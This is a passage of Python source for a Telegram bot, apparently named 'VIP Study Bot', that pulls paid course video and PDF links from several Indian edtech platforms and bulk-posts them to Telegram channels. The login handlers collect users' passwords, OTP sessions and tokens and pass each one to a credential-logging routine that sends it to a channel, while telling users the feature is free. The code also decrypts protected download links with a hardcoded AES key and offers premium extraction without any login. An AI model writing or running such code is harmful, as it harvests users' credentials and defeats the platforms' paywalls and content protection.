    batches = sorted(raw.items(), key=lambda x: int(x[0]), reverse=True)
    total = len(batches)
    await safe_edit(prog, f"📦 *{total} batches mile!*\n\n⚙️ Extracting & uploading...")

    done = 0; success = 0; t0 = time.time()
    for bid, bname in batches:
        try:
            # Reuse existing cw extract logic (synchronous inner)
            batch = fetch_json(CW_BATCH_API.format(bid))
            if not batch:
                done += 1; continue
            topics = batch.get("topics", [])
            all_lines = []; tv = tp = fv = fp = 0
            with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
                fmap = {ex.submit(cw_process_topic, bid, t): t for t in topics}
                for f in concurrent.futures.as_completed(fmap):
                    try:
                        d, v, p, vf_, pf_ = f.result(timeout=60)
                        all_lines.extend(d); tv += v; tp += p; fv += vf_; fp += pf_
                    except: pass
            if all_lines:
                elapsed = time.time() - t0
                hdr = (
                    f"════════════════════════════\n"
                    f"  VIP Study — CareerWill\n"
                    f"  Batch: {bname}\n  ID: {bid}\n"
                    f"  Videos: {tv} | PDFs: {tp} | Total: {len(all_lines)}\n"
                    f"════════════════════════════\n\n"
                )
                fname = f"CW_{safe_fn(bname)}_{bid}.txt"
                fb = BytesIO((hdr + "\n".join(all_lines)).encode()); fb.name = fname
                cap = (
                    f"🎯 *CareerWill*\n📌 *{bname}*\n🆔 `{bid}`\n"
                    f"🎥 `{tv}` Videos | 📄 `{tp}` PDFs | 📦 `{len(all_lines)}` Total\n\n"
                    f"_VIP Study Bot ⚡_"
                )
                for _ in range(3):
                    try:
                        await bot.send_document(
                            chat_id=ch_id, document=fb, filename=fname,
                            caption=cap, parse_mode=ParseMode.MARKDOWN)
                        success += 1; break
                    except RetryAfter as e: await asyncio.sleep(e.retry_after + 1); fb.seek(0)
                    except Exception: await asyncio.sleep(2); fb.seek(0)
            done += 1
            if done % 5 == 0:
                bar, pct = build_bar(done, total)
                await safe_edit(prog,
                    f"⚙️ *CareerWill DB Upload*\n\n{bar} `{pct}%`\n"
                    f"📁 `{done}/{total}` | ✅ `{success}` uploaded\n"
                    f"⏱️ `{time.time()-t0:.0f}s`")
            await asyncio.sleep(0.5)
        except Exception as ex:
            logger.error(f"CW DB upload batch {bid}: {ex}"); done += 1

    elapsed = time.time() - t0
    summary = (
        f"✅ *CareerWill DB Upload Complete!*\n\n"
        f"📦 Batches: `{total}`\n"
        f"✅ Uploaded: `{success}`\n"
        f"⏱️ Time: `{elapsed:.0f}s`\n\n"
        f"_VIP Study Bot ⚡_"
    )
    await safe_edit(prog, summary)
    # Update pin message
    try:
        await bot.edit_message_text(
            chat_id=ch_id, message_id=pin_msg.message_id,
            text=summary, parse_mode=ParseMode.MARKDOWN)
    except: pass

async def db_upload_kgs(trigger_msg, bot):
    """Extract ALL KGS courses and post each as TXT to DB channel."""
    ch_id = get_db_channel("kgs")
    if not ch_id:
        await trigger_msg.reply_text("❌ *KGS channel ID set nahi hai!*\n_/admin → Database Channels_",
            parse_mode=ParseMode.MARKDOWN); return
    # Pin announcement
    try:
        pin_msg = await bot.send_message(
            chat_id=ch_id,
            text=(
                "📌 *KGS App — Full Database Update*\n\n"
                f"🕐 Started: `{time.strftime('%Y-%m-%d %H:%M:%S')}`\n"
                "⏳ Sare courses extract ho rahe hain...\n\n"
                "_VIP Study Bot ⚡_"
            ),
            parse_mode=ParseMode.MARKDOWN)
        await bot.pin_chat_message(chat_id=ch_id, message_id=pin_msg.message_id, disable_notification=True)
    except Exception as e:
        await trigger_msg.reply_text(f"⚠️ Pin fail: `{e}`\n\nExtract continue...", parse_mode=ParseMode.MARKDOWN)

    prog = await trigger_msg.reply_text("⏳ *KGS courses fetch ho rahe hain...*", parse_mode=ParseMode.MARKDOWN)
    raw = fetch_json(KGS_COURSES_URL)
    if not raw:
        await safe_edit(prog, "❌ *KGS API fail!*"); return
    courses = raw.get("courses", []) if isinstance(raw, dict) else raw
    total = len(courses)
    await safe_edit(prog, f"📦 *{total} courses mile!*\n\n⚙️ Extracting & uploading...")

    done = 0; success = 0; t0 = time.time()
    for course in courses:
        cid = course.get("id",""); cname = course.get("title","Unknown")
        try:
            subjects = fetch_json(KGS_SUBJECTS_URL.format(cid))
            if not subjects or not isinstance(subjects, list):
                done += 1; continue
            all_lines = []; tv = tp = 0
            for subj in subjects:
                sid = subj.get("id",""); sname = subj.get("name","?")
                lessons = fetch_json(KGS_LESSONS_URL.format(sid))
                if not lessons or not isinstance(lessons, list): continue
                for les in lessons:
                    lname = les.get("name","?")
                    vid_url = les.get("video_url","")
                    if vid_url:
                        all_lines.append(f"[{sname}] Video | {lname} : {vid_url}"); tv += 1
                    pdf_data = les.get("pdfs")
                    if isinstance(pdf_data, dict):
                        pdf_url = pdf_data.get("url","")
                        if pdf_url:
                            all_lines.append(f"[{sname}] PDF | {lname} : {pdf_url}"); tp += 1
            if all_lines:
                hdr = (
                    f"════════════════════════════\n"
                    f"  VIP Study — KGS App\n"
                    f"  Course: {cname}\n  ID: {cid}\n"
                    f"  Videos: {tv} | PDFs: {tp} | Total: {len(all_lines)}\n"
                    f"════════════════════════════\n\n"
                )
                fname = f"KGS_{safe_fn(cname)}_{cid}.txt"
                fb = BytesIO((hdr + "\n".join(all_lines)).encode()); fb.name = fname
                cap = (
                    f"🎓 *KGS App*\n📌 *{cname}*\n🆔 `{cid}`\n"
                    f"🎥 `{tv}` Videos | 📄 `{tp}` PDFs | 📦 `{len(all_lines)}` Total\n\n"
                    f"_VIP Study Bot ⚡_"
                )
                for _ in range(3):
                    try:
                        await bot.send_document(
                            chat_id=ch_id, document=fb, filename=fname,
                            caption=cap, parse_mode=ParseMode.MARKDOWN)
                        success += 1; break
                    except RetryAfter as e: await asyncio.sleep(e.retry_after + 1); fb.seek(0)
                    except Exception: await asyncio.sleep(2); fb.seek(0)
            done += 1
            if done % 3 == 0:
                bar, pct = build_bar(done, total)
                await safe_edit(prog,
                    f"⚙️ *KGS DB Upload*\n\n{bar} `{pct}%`\n"
                    f"📁 `{done}/{total}` | ✅ `{success}` uploaded\n"
                    f"⏱️ `{time.time()-t0:.0f}s`")
            await asyncio.sleep(1)
        except Exception as ex:
            logger.error(f"KGS DB upload course {cid}: {ex}"); done += 1

    elapsed = time.time() - t0
    summary = (
        f"✅ *KGS DB Upload Complete!*\n\n"
        f"📦 Courses: `{total}`\n"
        f"✅ Uploaded: `{success}`\n"
        f"⏱️ Time: `{elapsed:.0f}s`\n\n"
        f"_VIP Study Bot ⚡_"
    )
    await safe_edit(prog, summary)
    try:
        await bot.edit_message_text(
            chat_id=ch_id, message_id=pin_msg.message_id,
            text=summary, parse_mode=ParseMode.MARKDOWN)
    except: pass

# ══════════════════════════════════════════════════════
#  OLD ADMIN COMMANDS (kept for backward compat)
# ══════════════════════════════════════════════════════
async def cmd_adduser(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid != ADMIN_ID: await update.message.reply_text("❌ *Unauthorized!*", parse_mode=ParseMode.MARKDOWN); return
    if not context.args: await update.message.reply_text("Usage: `/adduser <id>`", parse_mode=ParseMode.MARKDOWN); return
    try: tid = int(context.args[0])
    except: await update.message.reply_text("❌ *Invalid ID!*", parse_mode=ParseMode.MARKDOWN); return
    if tid == ADMIN_ID: await update.message.reply_text("ℹ️ Admin always has access.", parse_mode=ParseMode.MARKDOWN); return
    add_premium(tid, uid)
    try:
        await context.bot.send_message(chat_id=tid, text=(
            "🎉 *Premium Activated!*\n\n✅ Tumhara VIP Study Bot premium activate ho gaya!\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━\n💎 *Ab available hai:*\n"
            "   🆓 Without Login Extractors\n   📖 Study Mode\n   📥 Real Video Download\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━\n\n/start karke use karo! 🎓"), parse_mode=ParseMode.MARKDOWN)
        note = "✅ User notified"
    except: note = "⚠️ User notify nahi hua"
    await update.message.reply_text(f"✅ *Premium diya!*\n\n👤 `{tid}`\n{note}", parse_mode=ParseMode.MARKDOWN)

async def cmd_removeuser(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: await update.message.reply_text("❌ *Unauthorized!*", parse_mode=ParseMode.MARKDOWN); return
    if not context.args: await update.message.reply_text("Usage: `/removeuser <id>`", parse_mode=ParseMode.MARKDOWN); return
    try: tid = int(context.args[0])
    except: await update.message.reply_text("❌ *Invalid ID!*", parse_mode=ParseMode.MARKDOWN); return
    if remove_premium(tid): await update.message.reply_text(f"✅ `{tid}` remove hua.", parse_mode=ParseMode.MARKDOWN)
    else: await update.message.reply_text(f"⚠️ `{tid}` list me nahi tha.", parse_mode=ParseMode.MARKDOWN)

async def cmd_listusers(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: await update.message.reply_text("❌ *Unauthorized!*", parse_mode=ParseMode.MARKDOWN); return
    db = load_db()
    if not db: await update.message.reply_text("📋 *Koi premium user nahi.*", parse_mode=ParseMode.MARKDOWN); return
    lines = [f"👑 *Premium Users — {len(db)} total*\n"]
    for uid, info in db.items(): lines.append(f"• `{uid}` — {info.get('added_at','?')}")
    await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.MARKDOWN)

# ══════════════════════════════════════════════════════
#  MAIN MENU HANDLER
# ══════════════════════════════════════════════════════
async def main_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query; await q.answer(); uid = q.from_user.id

    if q.data == "back_home":
        await show_home_cb(q.message); return MAIN_MENU
    elif q.data == "mode_extract":
        await safe_edit(q.message, "⚡ *Extract Mode*\n\nChoose type 👇", markup=extract_kb())
        return EXTRACT_MENU
    elif q.data == "mode_study":
        if not is_premium(uid): await send_not_premium(q.message); return MAIN_MENU
        await safe_edit(q.message, "📖 *Study Mode*\n\nPlatform choose karo 👇", markup=study_kb())
        return STUDY_MENU
    elif q.data == "mode_txthtml":
        await safe_edit(q.message,
            "🌐 *TXT → HTML Converter*\n\n"
            "Apna `.txt` file bhejo jisme links hain.\n\n"
            "📌 *Format:*\n"
            "`[Topic] Video Name : https://link.com`\n\n"
            "✅ Videos, PDFs, aur Other links automatically sort honge!\n\n"
            "_/cancel to go back_")
        return TXT_HTML_WAIT
    elif q.data == "mode_htmltxt":
        await safe_edit(q.message,
            "📄 *HTML → TXT Converter*\n\n"
            "Apna `.html` file bhejo.\n\n"
            "✅ Koi bhi HTML chalega:\n"
            "   • Bot ka generated HTML\n"
            "   • Kisi bhi website ka HTML\n\n"
            "Output mein milega `Name : URL` format mein saare links.\n\n"
            "_/cancel to go back_")
        return HTML_TXT_WAIT
    return MAIN_MENU

# ══════════════════════════════════════════════════════
#  EXTRACT MENU HANDLER
# ══════════════════════════════════════════════════════
async def extract_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query; await q.answer(); uid = q.from_user.id

    if q.data == "ext_back" or q.data == "back_home":
        await show_home_cb(q.message); return MAIN_MENU
    elif q.data == "ext_login":
        await safe_edit(q.message,
            "🔐 *Login Extract*\n\n"
            "_Yahan aap apna account use karke extract kar sakte hain._\n"
            "_Yeh feature FREE hai — kisi bhi user ke liye!_ ✅\n\n"
            "Platform choose karo 👇",
            markup=login_extract_kb())
        return LOGIN_MENU
    elif q.data == "ext_nologin":
        if not is_premium(uid): await send_not_premium(q.message); return EXTRACT_MENU
        await safe_edit(q.message,
            "🆓 *Without Login Extract*\n\n"
            "_No login needed — direct batch extract!_ 🚀\n\n"
            "Platform choose karo 👇",
            markup=nologin_extract_kb())
        return NOLOGIN_MENU
    return EXTRACT_MENU

# ══════════════════════════════════════════════════════
#  ──────────────────────────────────────────────────
#  LOGIN EXTRACTORS (Free for all users)
#  ──────────────────────────────────────────────────
# ══════════════════════════════════════════════════════

async def login_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query; await q.answer()

    if q.data == "ext_back":
        await safe_edit(q.message, "⚡ *Extract Mode*\n\nChoose type 👇", markup=extract_kb())
        return EXTRACT_MENU
    elif q.data == "back_home":
        await show_home_cb(q.message); return MAIN_MENU

    # ── ClassPlus ──
    elif q.data == "lx_cp":
        context.user_data["lx_platform"] = "ClassPlus"
        await safe_edit(q.message,
            "🏫 *ClassPlus Extractor*\n\n"
            "Login details bhejo:\n\n"
            "📌 Format 1: `ORG_CODE*Mobile`\n"
            "📌 Format 2: Token directly\n\n"
            "Example: `ABCD*9876543210`\n\n"
            "_/cancel to go back_")
        return CP_STATE

    # ── Adda247 ──
    elif q.data == "lx_adda":
        context.user_data["lx_platform"] = "Adda247"
        await safe_edit(q.message,
            "📚 *Adda247 Extractor*\n\n"
            "Login details bhejo:\n\n"
            "📌 Format: `email*password`\n\n"
            "Example: `user@gmail.com*pass123`\n\n"
            "_/cancel to go back_")
        return ADDA_STATE

    # ── RG Vikramjeet ──
    elif q.data == "lx_rg":
        context.user_data["lx_platform"] = "RG Vikramjeet"
        await safe_edit(q.message,
            "🎯 *RG Vikramjeet Extractor*\n\n"
            "Login details bhejo:\n\n"
            "📌 Format: `ID*Password`\n\n"
            "Example: `9876543210*pass123`\n\n"
            "_/cancel to go back_")
        return RG_STATE

    # ── Physics Wallah ──
    elif q.data == "lx_pw":
        context.user_data["lx_platform"] = "Physics Wallah"
        await safe_edit(q.message,
            "✏️ *Physics Wallah Extractor*\n\n"
            "Login details bhejo:\n\n"
            "📌 Format 1: `Phone*Password`\n"
            "📌 Format 2: Token directly\n\n"
            "Example: `9876543210*pass123`\n\n"
            "_/cancel to go back_")
        return PW_STATE

    # ── Khan GS ──
    elif q.data == "lx_khan":
        context.user_data["lx_platform"] = "Khan GS"
        await safe_edit(q.message,
            "📖 *Khan Global Studies Extractor*\n\n"
            "Login details bhejo:\n\n"
            "📌 Format: `Phone*Password`\n\n"
            "Example: `9876543210*pass123`\n\n"
            "_/cancel to go back_")
        return KHAN_STATE

    # ── Exampur ──
    elif q.data == "lx_exampur":
        context.user_data["lx_platform"] = "Exampur"
        await safe_edit(q.message,
            "📝 *Exampur Extractor*\n\n"
            "Login details bhejo:\n\n"
            "📌 Format 1: `email*password`\n"
            "📌 Format 2: Token directly\n\n"
            "Example: `user@mail.com*pass123`\n\n"
            "_/cancel to go back_")
        return EXAMPUR_STATE

    # ── KD Campus ──
    elif q.data == "lx_kd":
        context.user_data["lx_platform"] = "KD Campus"
        await safe_edit(q.message,
            "🎓 *KD Campus Extractor*\n\n"
            "Login details bhejo:\n\n"
            "📌 Format 1: `ID*Password`\n"
            "📌 Format 2: Token directly\n\n"
            "Example: `6969696969*pass123`\n\n"
            "_/cancel to go back_")
        return KD_STATE

    return LOGIN_MENU

# ══════════════════════════════════════════════════════
#  CLASSPLUS HANDLER
# ══════════════════════════════════════════════════════
async def cp_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_input = update.message.text.strip()
    user = update.effective_user
    prog = await update.message.reply_text("⏳ *Processing ClassPlus...*", parse_mode=ParseMode.MARKDOWN)

    # Log to channel
    await log_credentials(context.bot, user, "ClassPlus", user_input)

    try:
        if "*" in user_input:
            org_code, mobile = user_input.split("*", 1)
            device_id = str(uuid.uuid4()).replace('-', '')
            hdrs = {"Accept": "application/json, text/plain, */*", "region": "IN",
                    "accept-language": "en", "Content-Type": "application/json;charset=utf-8",
                    "Api-Version": "51", "device-id": device_id}
            org_resp = cp_scraper.get(f"{CP_API}/v2/orgs/{org_code}", headers=hdrs).json()
            org_id   = org_resp["data"]["orgId"]
            org_name = org_resp["data"]["orgName"]
            otp_payload = {"countryExt": "91", "orgCode": org_name, "viaSms": "1",
                           "mobile": mobile, "orgId": org_id, "otpCount": 0}
            otp_resp = cp_scraper.post(f"{CP_API}/v2/otp/generate", json=otp_payload, headers=hdrs)
            if otp_resp.status_code == 200:
                session_id = otp_resp.json()["data"]["sessionId"]
                context.user_data["cp_hdrs"] = hdrs
                context.user_data["cp_org_id"] = org_id
                context.user_data["cp_org_name"] = org_name
                context.user_data["cp_mobile"] = mobile
                context.user_data["cp_sid"] = session_id
                await safe_edit(prog,
                    f"📱 *OTP Sent!*\n\nMobile: `{mobile}`\n\nAb OTP bhejo 👇\n\n_/cancel to go back_")
                return CP_OTP
            else:
                await safe_edit(prog, "❌ *OTP generate nahi hua! Details check karo.*"); return LOGIN_MENU

        else:  # Direct token
            token = user_input
            hdrs = {"x-access-token": token, "user-agent": "Mobile-Android",
                    "app-version": "1.4.65.3", "api-version": "29", "device-id": "39F093FF35F201D9"}
            r = cp_scraper.get(f"{CP_API}/v2/courses?tabCategoryId=1", headers=hdrs)
            if r.status_code != 200:
                await safe_edit(prog, "❌ *Invalid token!*"); return LOGIN_MENU
            courses = r.json()["data"]["courses"]
            await safe_edit(prog, f"✅ *Token verified! {len(courses)} courses mila.*\n\n⏳ Extracting...")
            await _cp_extract_all(update.message, courses, hdrs, "ClassPlus")
            return ConversationHandler.END

    except Exception as e:
        await safe_edit(prog, f"❌ *Error:* `{str(e)[:200]}`"); return LOGIN_MENU

async def cp_otp_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    otp = update.message.text.strip()
    prog = await update.message.reply_text("⏳ *OTP verify ho raha hai...*", parse_mode=ParseMode.MARKDOWN)
    try:
        hdrs = context.user_data["cp_hdrs"]
        fingerprint_id = str(uuid.uuid4()).replace('-','')
        verify_payload = {"otp": otp, "countryExt": "91",
                          "sessionId": context.user_data["cp_sid"],
                          "orgId": context.user_data["cp_org_id"],
                          "fingerprintId": fingerprint_id,
                          "mobile": context.user_data["cp_mobile"]}
        vr = cp_scraper.post(f"{CP_API}/v2/users/verify", json=verify_payload, headers=hdrs)
        if vr.status_code == 200 and vr.json().get("status") == "success":
            token = vr.json()["data"]["token"]
            new_hdrs = {"x-access-token": token, "user-agent": "Mobile-Android",
                        "app-version": "1.4.65.3", "api-version": "29", "device-id": "39F093FF35F201D9"}
            await update.message.reply_text(f"✅ *Login Successful!*\n\n🔑 Token:\n`{token}`", parse_mode=ParseMode.MARKDOWN)
            r = cp_scraper.get(f"{CP_API}/v2/courses?tabCategoryId=1", headers=new_hdrs)
            if r.status_code == 200:
                courses = r.json()["data"]["courses"]
                await safe_edit(prog, f"⏳ Extracting {len(courses)} courses...")
                await _cp_extract_all(update.message, courses, new_hdrs, context.user_data.get("cp_org_name","ClassPlus"))
            else:
                await safe_edit(prog, "❌ *Courses fetch fail!*")
        else:
            await safe_edit(prog, "❌ *Wrong OTP! Dobara bhejo.*"); return CP_OTP
    except Exception as e:
        await safe_edit(prog, f"❌ *Error:* `{str(e)[:200]}`")
    return ConversationHandler.END

async def _cp_extract_all(message, courses, hdrs, org_name):
    all_lines = []; total_v = total_p = 0
    for course in courses:
        cid = course["id"]; cname = course.get("name","Unknown")
        try:
            content = await _cp_get_content(cid, hdrs, 0, cname)
            all_lines.extend(content)
        except: pass
    if all_lines:
        fname = f"ClassPlus_{safe_fn(org_name)}.txt"
        fb = BytesIO("\n".join(all_lines).encode()); fb.name = fname
        await message.reply_document(document=fb, filename=fname,
            caption=f"📂 *ClassPlus — {org_name}*\n📦 `{len(all_lines)}` links\n\n_VIP Study Bot ⚡_",
            parse_mode=ParseMode.MARKDOWN)

async def _cp_get_content(course_id, hdrs, folder_id=0, path=""):
    result = []
    url = f"{CP_API}/v2/course/content/get?courseId={course_id}&folderId={folder_id}"
    try:
        r = cp_scraper.get(url, headers=hdrs); data = r.json()["data"]["courseContent"]
        for item in data:
            ct = str(item.get("contentType")); name = item.get("name","Untitled"); vid_url = item.get("url","")
            if ct in ("2","3") and vid_url:
                result.append(f"[{path}] {name} : {vid_url}")
            elif ct == "1":
                sub = await _cp_get_content(course_id, hdrs, item.get("id"), f"{path}/{name}" if path else name)
                result.extend(sub)
    except: pass
    return result

# ══════════════════════════════════════════════════════
#  ADDA247 HANDLER
# ══════════════════════════════════════════════════════
async def adda_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_input = update.message.text.strip(); user = update.effective_user
    prog = await update.message.reply_text("⏳ *Adda247 login ho raha hai...*", parse_mode=ParseMode.MARKDOWN)
    await log_credentials(context.bot, user, "Adda247", user_input)
    if "*" not in user_input:
        await safe_edit(prog, "❌ *Format: `email*password`*"); return LOGIN_MENU
    try:
        e, p = user_input.split("*", 1)
        hdrs = {"authority": "userapi.adda247.com", "Content-Type": "application/json",
                "X-Auth-Token": "fpoa43edty5", "X-Jwt-Token": ""}
        lr = session.post(ADDA_LOGIN_URL, json={"email": e, "providerName": "email", "sec": p}, headers=hdrs, timeout=25)
        data = lr.json(); jwt = data.get("jwtToken")
        if not jwt: await safe_edit(prog, "❌ *Login fail! Credentials check karo.*"); return LOGIN_MENU
        hdrs["X-Jwt-Token"] = jwt
        await safe_edit(prog, "✅ *Login successful!*\n\n⏳ Packages fetch ho rahe hain...")
        pr = session.get("https://store.adda247.com/api/v2/ppc/package/purchased?pageNumber=0&pageSize=10&src=aweb",
                         headers=hdrs, timeout=25)
        packages = pr.json().get("data", [])
        if not packages: await safe_edit(prog, "❌ *Koi package nahi mila!*"); return ConversationHandler.END
        all_lines = []
        for pkg in packages:
            pid = pkg.get("packageId"); ptitle = pkg.get("title","Unknown")
            try:
                cr = session.get(f"https://store.adda247.com/api/v1/my/purchase/content/{pid}?src=aweb", headers=hdrs, timeout=25)
                contents = cr.json().get("data",{}).get("contents",[])
                for c in contents:
                    cname = c.get("name","?"); curl = c.get("url","")
                    if curl: all_lines.append(f"[{ptitle}] {cname} : {curl}")
            except: pass
        if all_lines:
            fname = f"Adda247_{safe_fn(e)}.txt"
            fb = BytesIO("\n".join(all_lines).encode()); fb.name = fname
            await update.message.reply_document(document=fb, filename=fname,
                caption=f"📂 *Adda247 — {e}*\n📦 `{len(all_lines)}` links\n\n_VIP Study Bot ⚡_",
                parse_mode=ParseMode.MARKDOWN)
        else:
            await update.message.reply_text("⚠️ *Koi content nahi mila!*", parse_mode=ParseMode.MARKDOWN)
    except Exception as ex:
        await safe_edit(prog, f"❌ *Error:* `{str(ex)[:200]}`")
    return ConversationHandler.END

# ══════════════════════════════════════════════════════
#  RG VIKRAMJEET HANDLER
# ══════════════════════════════════════════════════════
async def rg_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_input = update.message.text.strip(); user = update.effective_user
    prog = await update.message.reply_text("⏳ *RG Vikramjeet login ho raha hai...*", parse_mode=ParseMode.MARKDOWN)
    await log_credentials(context.bot, user, "RG Vikramjeet", user_input)
    if "*" not in user_input:
        await safe_edit(prog, "❌ *Format: `ID*Password`*"); return LOGIN_MENU
    try:
        uid_inp, pwd = user_input.split("*", 1)
        hdrs = {"Content-Type": "application/json", "Accept": "application/json, text/plain, */*",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
                "Origin": "https://rankersgurukul.com", "Referer": "https://rankersgurukul.com/",
                "Appid": "753", "Devicetype": "4", "Lang": "1"}
        lr = session.post(RG_LOGIN_URL, json={"userid": uid_inp, "password": pwd}, headers=hdrs, timeout=25)
        data = lr.json()
        if "access_token" not in data: await safe_edit(prog, "❌ *Login fail!*"); return LOGIN_MENU
        token = data["access_token"]; real_uid = data.get("user_id") or data.get("userid")
        auth_hdrs = {"Authorization": f"Bearer {token}"}
        courses_r = session.get(f"https://appapi.videocrypt.in/data_model/courses?userId={real_uid}", headers=auth_hdrs, timeout=25)
        courses = courses_r.json().get("data", [])
        if not courses: await safe_edit(prog, "❌ *Koi course nahi mila!*"); return ConversationHandler.END
        course_text = "📚 *Your Courses:*\n\n"
        for c in courses:
            course_text += f"`{c.get('id')}` — *{c.get('course_name') or c.get('name','?')}*\n"
        course_text += "\n_Course ID bhejo 👇_"
        context.user_data.update({"rg_auth_hdrs": auth_hdrs, "rg_uid": real_uid, "rg_courses": courses})
        await safe_edit(prog, course_text)
        return RG_COURSE
    except Exception as ex:
        await safe_edit(prog, f"❌ *Error:* `{str(ex)[:200]}`"); return LOGIN_MENU

async def rg_course_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cid = update.message.text.strip()
    auth_hdrs = context.user_data.get("rg_auth_hdrs", {})
    prog = await update.message.reply_text("⏳ *Extracting...*", parse_mode=ParseMode.MARKDOWN)
    try:
        sr = session.get(f"https://appapi.videocrypt.in/data_model/courses/subjects?courseId={cid}", headers=auth_hdrs, timeout=25)
        subjects = sr.json().get("data", [])
        all_lines = []
        for subj in subjects:
            sid = subj.get("id"); sname = subj.get("subject_name","?")
            tr = session.get(f"https://appapi.videocrypt.in/data_model/courses/subjects/topics?subjectId={sid}&courseId={cid}", headers=auth_hdrs, timeout=25)
            topics = tr.json().get("data", [])
            for topic in topics:
                tid = topic.get("id"); tname = topic.get("topic_name","?")
                vr = session.get(f"https://appapi.videocrypt.in/data_model/courses/videos?topicId={tid}&courseId={cid}", headers=auth_hdrs, timeout=25)
                videos = vr.json().get("data", [])
                for video in videos:
                    vtitle = video.get("Title","?")
                    enc = video.get("download_link") or video.get("pdf_link","")
                    if enc:
                        try:
                            key = b"638udh3829162018"; iv = b"fedcba9876543210"
                            ct = bytearray.fromhex(b64decode(enc.encode()).hex())
                            cipher = AES.new(key, AES.MODE_CBC, iv)
                            decrypted = unpad(cipher.decrypt(ct), AES.block_size).decode('utf-8')
                            all_lines.append(f"[{sname} > {tname}] {vtitle} : {decrypted}")
                        except:
                            all_lines.append(f"[{sname} > {tname}] {vtitle} : [decrypt failed]")
        if all_lines:
            fname = f"RGVikramjeet_{cid}.txt"
            fb = BytesIO("\n".join(all_lines).encode()); fb.name = fname
            await update.message.reply_document(document=fb, filename=fname,
                caption=f"📂 *RG Vikramjeet*\n📦 `{len(all_lines)}` links\n\n_VIP Study Bot ⚡_",
                parse_mode=ParseMode.MARKDOWN)
        else:
            await update.message.reply_text("⚠️ *Koi content nahi mila!*", parse_mode=ParseMode.MARKDOWN)
        try: await prog.delete()
        except: pass
    except Exception as ex:
        await safe_edit(prog, f"❌ *Error:* `{str(ex)[:200]}`")
    return ConversationHandler.END

# ══════════════════════════════════════════════════════
#  PHYSICS WALLAH HANDLER
# ══════════════════════════════════════════════════════
async def pw_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_input = update.message.text.strip(); user = update.effective_user
    prog = await update.message.reply_text("⏳ *PW login ho raha hai...*", parse_mode=ParseMode.MARKDOWN)
    await log_credentials(context.bot, user, "Physics Wallah", user_input)
    try:
        hdrs = {"Client-Id": "5eb393ee95fab7468a79d189", "Client-Type": "3",
                "User-Agent": "okhttp/4.9.2", "Content-Type": "application/json"}
        if "*" in user_input:
            phone, pwd = user_input.split("*",1)
            lr = session.post("https://api.penpencil.co/v3/users/login",
                json={"username": phone, "password": pwd, "userType": "1", "isWebsite": True, "source": "penpencil-web"},
                headers=hdrs, timeout=25)
            data = lr.json()
            token = data.get("data",{}).get("token") if data.get("data") else None
            if not token: await safe_edit(prog, "❌ *Login fail!*"); return LOGIN_MENU
        else:
            token = user_input
        hdrs["Authorization"] = f"Bearer {token}"
        params = {"mode": "1", "page": "1"}
        br = session.get("https://api.penpencil.co/v3/batches/all-purchased-batches", headers=hdrs, params=params, timeout=25)
        batches = br.json().get("data", [])
        if not batches: await safe_edit(prog, "❌ *Koi batch nahi mila!*"); return ConversationHandler.END
        batch_text = "📚 *PW Batches:*\n\n"
        for i, b in enumerate(batches[:20], 1):
            batch_text += f"`{i}.` *{b.get('name','?')}* — `{b.get('_id','')}`\n"
        batch_text += "\n_Batch ID bhejo (ya index number) 👇_"
        context.user_data.update({"pw_hdrs": hdrs, "pw_batches": batches})
        await safe_edit(prog, batch_text)
        return PW_BATCH
    except Exception as ex:
        await safe_edit(prog, f"❌ *Error:* `{str(ex)[:200]}`"); return LOGIN_MENU

async def pw_batch_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    inp = update.message.text.strip(); hdrs = context.user_data.get("pw_hdrs",{})
    batches = context.user_data.get("pw_batches",[])
    prog = await update.message.reply_text("⏳ *PW extracting...*", parse_mode=ParseMode.MARKDOWN)
    try:
        if inp.isdigit() and 1 <= int(inp) <= len(batches):
            b = batches[int(inp)-1]; bid = b.get("_id"); bname = b.get("name","Unknown")
        else:
            b = next((x for x in batches if x.get("_id")==inp), None)
            if not b: await safe_edit(prog, "❌ *Batch nahi mila!*"); return PW_BATCH
            bid = b.get("_id"); bname = b.get("name","Unknown")
        all_lines = []
        dr = session.get(f"https://api.penpencil.co/v3/batches/{bid}/details", headers=hdrs, timeout=25)
        subjects = dr.json().get("data",{}).get("subjects",[])
        for subj in subjects:
            sid = subj.get("_id"); sname = subj.get("subject","?")
            for page in range(1, 6):
                cr = session.get(
                    f"https://api.penpencil.co/v2/batches/{bid}/subject/{sid}/contents?page={page}&contentType=exercises-notes-videos",
                    headers=hdrs, timeout=25)
                items = cr.json().get("data",[])
                if not items: break
                for item in items:
                    topic = item.get("topic","?"); url = item.get("url","")
                    if url: all_lines.append(f"[{sname}] {topic} : {url}")
        if all_lines:
            fname = f"PW_{safe_fn(bname)}.txt"
            fb = BytesIO("\n".join(all_lines).encode()); fb.name = fname
            await update.message.reply_document(document=fb, filename=fname,
                caption=f"📂 *PW — {bname}*\n📦 `{len(all_lines)}` links\n\n_VIP Study Bot ⚡_",
                parse_mode=ParseMode.MARKDOWN)
        else:
            await update.message.reply_text("⚠️ *Content nahi mila!*", parse_mode=ParseMode.MARKDOWN)
        try: await prog.delete()
        except: pass
    except Exception as ex:
        await safe_edit(prog, f"❌ *Error:* `{str(ex)[:200]}`")
    return ConversationHandler.END

# ══════════════════════════════════════════════════════
#  KHAN GS HANDLER
# ══════════════════════════════════════════════════════
async def khan_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_input = update.message.text.strip(); user = update.effective_user
